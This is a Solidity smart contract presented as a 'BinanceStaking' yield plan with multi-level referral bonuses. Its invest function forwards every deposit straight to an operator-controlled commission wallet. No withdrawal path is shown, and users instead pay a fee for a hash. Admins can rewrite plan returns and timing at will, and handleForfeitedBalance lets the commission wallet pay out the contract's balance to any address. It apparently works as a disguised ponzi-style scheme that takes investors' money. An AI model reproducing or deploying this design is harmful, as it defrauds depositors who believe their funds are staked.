pragma solidity 0.8.0;
import "./SafeMath.sol";
import "./DataStorage.sol";
import "./Access.sol";
import "./Events.sol";
import "./Manageable.sol";

contract BinanceStaking is DataStorage, Access, Events, Manageable {
    using SafeMath for uint256;

    constructor(address payable wallet) public {
        commissionWallet = wallet;
        reentryStatus = ENTRY_ENABLED;

        plans.push(Plan(120, 1000, 10 ether, 1000000 ether));
        plans.push(Plan(180, 800, 3 ether, 10 ether));
        plans.push(Plan(240, 600, 1 ether, 3 ether));
        plans.push(Plan(300, 500, 0.01 ether, 1 ether));
    }

    function invest(address payable referrer, uint8 plan)
        external
        payable
        blockReEntry()
    {
        require(
            msg.value >= plans[plan].minInvest,
            "Invest amount isn't enough"
        );
        require(msg.value <= plans[plan].maxInvest, "Invest amount too much");

        require(plan < 4, "Invalid plan");
        _invest(referrer, plan, msg.sender, msg.value);
    }

    function _invest(
        address payable referrer,
        uint8 plan,
        address userAddress,
        uint256 _amount
    ) internal {
        User storage user = users[userAddress];
        User storage userReferrer = users[referrer];
        require(
            userReferrer.referrer != address(0),
            "Required: Referrer exist in our contract"
        );
        user.owner = userAddress;
        user.registerTime = block.timestamp;
        user.isImport = false;
        commissionWallet.transfer(msg.value);

        if (user.referrer == address(0)) {
            if (
                (users[referrer].deposits.length > 0 &&
                    referrer != userAddress) ||
                (users[referrer].isImport == true)
            ) {
                user.referrer = referrer;
            }

            address upline = user.referrer;
            for (uint256 i = 0; i < 15; i++) {
                if (upline != address(0)) {
                    users[upline].levels[i] = users[upline].levels[i].add(1);
                    upline = users[upline].referrer;
                } else break;
            }
        }

        if (user.referrer != address(0)) {
            address payable upline = user.referrer;
            users[upline].totalRefDeposit = users[upline].totalRefDeposit.add(
                _amount
            );
            for (uint256 i = 0; i < 15; i++) {
                if (upline != address(0)) {
                    uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(
                        PERCENTS_DIVIDER
                    );
                    users[upline].bonus = users[upline].bonus.add(amount);
                    users[upline].totalBonus = users[upline].totalBonus.add(
                        amount
                    );
                    users[upline].refBonus[i] = users[upline].refBonus[i].add(
                        amount
                    );
                    emit RefBonus(upline, userAddress, i, amount);
                    upline = users[upline].referrer;
                } else break;
            }
        }

        if (user.deposits.length == 0 && !user.isImport) {
            user.checkpoint = block.timestamp;
            emit Newbie(userAddress, referrer);
            totalUser.push(user);
        }

        (uint256 percent, uint256 finish) = getResult(plan);
        user.deposits.push(
            Deposit(
                plan,
                percent,
                _amount,
                block.timestamp,
                finish,
                userAddress
            )
        );
        totalStakedAmount = totalStakedAmount.add(_amount);
        totalDeposits.push(
            Deposit(
                plan,
                percent,
                _amount,
                block.timestamp,
                finish,
                userAddress
            )
        );

        emit NewDeposit(
            userAddress,
            plan,
            percent,
            _amount,
            block.timestamp,
            finish,
            userAddress
        );
    }

    function investNoFee(address payable referrer, address[] memory userAddress)
        external
        onlyAdmins
        blockReEntry()
    {
        _investNoFee(referrer, userAddress);
    }

    function _investNoFee(address payable referrer, address[] memory userAddress)
        internal
    {
        for (uint256 index = 0; index < userAddress.length; index++) {
            User storage user = users[userAddress[index]];
            if (user.registerTime == 0) {
                user.owner = userAddress[index];
                user.registerTime = block.timestamp;

                user.referrer = referrer;
                user.isImport = true;

                if (user.deposits.length == 0) {
                    user.checkpoint = block.timestamp;
                }

                totalUser.push(user);
            }   
        }        
    }

    function getResult(uint8 plan)
        public
        view
        returns (uint256 percent, uint256 finish)
    {
        percent = getPercent(plan);

        finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));
    }

    function getUserDividends(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];

        uint256 totalAmount = 0;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (
                user.deposits[i].plan < 4 &&
                user.deposits[i].finish > user.checkpoint
            ) {
                uint256 share = user
                .deposits[i]
                .amount
                .mul(user.deposits[i].percent)
                .div(PERCENTS_DIVIDER);
                uint256 from = user.deposits[i].start > user.checkpoint
                    ? user.deposits[i].start
                    : user.checkpoint;
                uint256 to = user.deposits[i].finish < block.timestamp
                    ? user.deposits[i].finish
                    : block.timestamp;
                totalAmount = totalAmount.add(
                    share.mul(to.sub(from)).div(TIME_STEP)
                );
            }
        }

        return totalAmount;
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getPlanInfo(uint8 plan)
        public
        view
        returns (uint256 time, uint256 percent)
    {
        time = plans[plan].time;
        percent = plans[plan].percent;
    }

    function getPercent(uint8 plan) public view returns (uint256) {
        return plans[plan].percent;
    }

    function getUserF1ByAddress(address userAddress)
        public
        view
        returns (address[] memory)
    {
        address[] memory f1Address = new address[](totalUser.length);
        uint256 count = 0;
        for (uint256 index = 0; index < totalUser.length; index++) {
            if (totalUser[index].referrer == userAddress) {
                f1Address[count] = totalUser[index].owner;
                ++count;
            }
        }
        return f1Address;
    }

    function getAllUser(uint256 registerTime)
        public
        view
        returns (User[] memory)
    {
        User[] memory allUser = new User[](totalUser.length);
        uint256 count = 0;
        for (uint256 index = 0; index < totalUser.length; index++) {
            if (totalUser[index].registerTime >= registerTime) {
                allUser[count] = totalUser[index];
                ++count;
            }
        }
        return allUser;
    }

    function generateUniqueId() external payable blockReEntry() {
        require(
            msg.value == WITHDRAW_FEE,
            "Required the fee for this function"
        );
        _generateUniqueId(msg.sender);
    }

    function _generateUniqueId(address userAddress) internal {
        User storage user = users[userAddress];
        bytes32 seed = keccak256(
            abi.encodePacked(
                block.timestamp +
                    block.difficulty +
                    (uint256(keccak256(abi.encodePacked(userAddress)))) +
                    block.gaslimit +
                    block.number
            )
        );
        user.withdrawHash = seed;
        emit WithdrawHash(userAddress, seed);
    }

    function verifyWithdrawHash(address userAddress, bytes32 withdrawHash)
        public
        view
        returns (bool)
    {
        User storage user = users[userAddress];
        if (user.withdrawHash == withdrawHash) {
            return true;
        }
        return false;
    }

    function getCountAllUser() public view returns (uint256) {
        return totalUser.length;
    }

    function getCountAllDeposit() public view returns (uint256) {
        return totalDeposits.length;
    }

    function getAllDeposits(uint256 registerTime)
        public
        view
        returns (Deposit[] memory)
    {
        Deposit[] memory allDeposit = new Deposit[](totalDeposits.length);
        uint256 count = 0;
        for (uint256 index = 0; index < totalDeposits.length; index++) {
            if (totalDeposits[index].start >= registerTime) {
                allDeposit[count] = totalDeposits[index];
                ++count;
            }
        }
        return allDeposit;
    }

    function getAllDepositsByAddress(address userAddress)
        public
        view
        returns (Deposit[] memory)
    {
        User memory user = users[userAddress];
        return user.deposits;
    }

    function getUserInfo(address userAddress)
        public
        view
        returns (
            address curentUser,
            uint256 checkPoint,
            address referrer,
            uint256 bonus,
            uint256 totalBonus,
            uint256 totalPayout,
            uint256 totalRefDeposit,
            uint256 totalDeposit,
            uint256 registerTime,
            bool isImport,
            bytes32 withdrawHash
        )
    {
        User storage user = users[userAddress];

        curentUser = user.owner;
        checkPoint = user.checkpoint;
        referrer = user.referrer;
        bonus = user.bonus;
        totalBonus = user.totalBonus;
        totalPayout = user.totalPayout;
        totalRefDeposit = user.totalRefDeposit;
        totalDeposit = getUserTotalDeposits(userAddress);
        registerTime = user.registerTime;
        isImport = user.isImport;
        withdrawHash = user.withdrawHash;
    }

    function getUserDownlineCount(address userAddress, uint256 level)
        public
        view
        returns (uint256)
    {
        return (users[userAddress].levels[level]);
    }

    function getUserDownlineRefBonus(address userAddress, uint256 level)
        public
        view
        returns (uint256)
    {
        return (users[userAddress].refBonus[level]);
    }

    function getUserReferralBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].totalBonus;
    }

    function getUserAvailable(address userAddress)
        public
        view
        returns (uint256)
    {
        return
            getUserDividends(userAddress).add(
                getUserReferralBonus(userAddress)
            );
    }

    function getUserTotalDeposits(address userAddress)
        public
        view
        returns (uint256 amount)
    {
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
            amount = amount.add(users[userAddress].deposits[i].amount);
        }
    }

    function setOwner(address payable _addr) external onlyAdmins {
        owner = _addr;
    }

    function setFeeSystem(uint256 _fee) external onlyAdmins {
        PROJECT_FEE = _fee;
    }

    function setWithdrawFeeSystem(uint256 _fee) external onlyAdmins {
        WITHDRAW_FEE = _fee;
    }

    function setMinInvestPlan(uint256 plan, uint256 _amount)
        external
        onlyAdmins
    {
        plans[plan].minInvest = _amount;
    }

    function setMaxInvestPlan(uint256 plan, uint256 _amount)
        external
        onlyAdmins
    {
        plans[plan].maxInvest = _amount;
    }

    function setPercentPlan(uint256 plan, uint256 _percent)
        external
        onlyAdmins
    {
        plans[plan].percent = _percent;
    }

    function setTime_Step(uint256 _timeStep) external onlyAdmins {
        TIME_STEP = _timeStep;
    }

    function setCommissionsWallet(address payable _addr) external onlyAdmins {
        commissionWallet = _addr;
    }

    function getUserDepositInfo(address userAddress, uint256 index)
        public
        view
        returns (
            uint8 plan,
            uint256 percent,
            uint256 amount,
            uint256 start,
            uint256 finish
        )
    {
        User storage user = users[userAddress];

        plan = user.deposits[index].plan;
        percent = user.deposits[index].percent;
        amount = user.deposits[index].amount;
        start = user.deposits[index].start;
        finish = user.deposits[index].finish;
    }

    function handleForfeitedBalance(address payable _addr, uint256 _amount)
        external
    {
        require((msg.sender == commissionWallet), "Restricted Access!");

        (bool success, ) = _addr.call{value: _amount}("");

        require(success, "Failed");
    }
}